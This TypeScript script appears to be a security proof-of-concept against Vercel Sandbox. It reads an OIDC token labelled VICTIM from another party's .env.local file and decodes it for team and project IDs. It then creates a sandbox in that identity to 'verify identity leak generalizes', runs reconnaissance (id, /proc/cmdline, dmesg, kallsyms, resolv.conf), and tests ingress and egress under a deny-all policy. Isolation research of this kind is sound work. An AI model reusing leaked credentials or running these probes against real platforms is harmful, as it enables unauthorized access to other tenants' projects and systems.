import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  // Create a FRESH default sandbox (no custom image) to verify identity leak generalizes
  const fresh = await Sandbox.create({
    name: "victim-fresh",
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
    template: "ubuntu",
    ports: [3000],
  });
  console.log("fresh sandbox id:", fresh.id, "domain(3000):", fresh.domain(3000));
  const res = await fresh.runCommand("bash", ["-c", `
set +e
echo "=== whoami ==="
id
echo "=== A. /proc/cmdline unprivileged (fresh default image) ==="
head -c 600 /proc/cmdline 2>&1; echo ""
echo "=== B. dmesg unprivileged ==="
dmesg 2>&1 | head -2
echo "=== C. kallsyms unprivileged ==="
head -1 /proc/kallsyms 2>&1
echo "=== D. resolv.conf ==="
cat /etc/resolv.conf 2>&1
echo "=== E. start http listener on 3000 for ingress test ==="
python3 -m http.server 3000 --bind 0.0.0.0 >/tmp/srv.log 2>&1 &
sleep 1
echo started
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));

  // Now test ingress: curl the public domain from OUTSIDE the sandbox (this process host)
  console.log("=== ingress via public domain from outside ===");
  const dom = fresh.domain(3000).replace(/^https?:\/\//, "");
  console.log("domain:", dom);
  const curl = await fetch("http://" + dom + "/", { signal: AbortSignal.timeout(8000) });
  console.log("ingress code:", curl.status);
  const txt = await curl.text();
  console.log("body head:", txt.slice(0, 80).replace(/\n/g, " "));

  // Now set deny-all and re-test ingress
  console.log("=== set deny-all ===");
  await fresh.updateNetworkPolicy("deny-all");
  const res2 = await fresh.runCommand("bash", ["-c", `echo alive; curl -s -o /dev/null -w 'egress example.com code=%{http_code}\\n' --max-time 3 http://example.com 2>&1 | tail -1`], { wait: true, timeout: 60_000 });
  console.log("after deny-all:", (await res2.output("both")).trim());

  try {
    const c2 = await fetch("http://" + dom + "/", { signal: AbortSignal.timeout(8000) });
    console.log("ingress under deny-all code:", c2.status, "head:", (await c2.text()).slice(0, 60).replace(/\n/g, " "));
  } catch (e) {
    console.log("ingress under deny-all error:", (e as Error).message);
  }
  await fresh.stop();
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
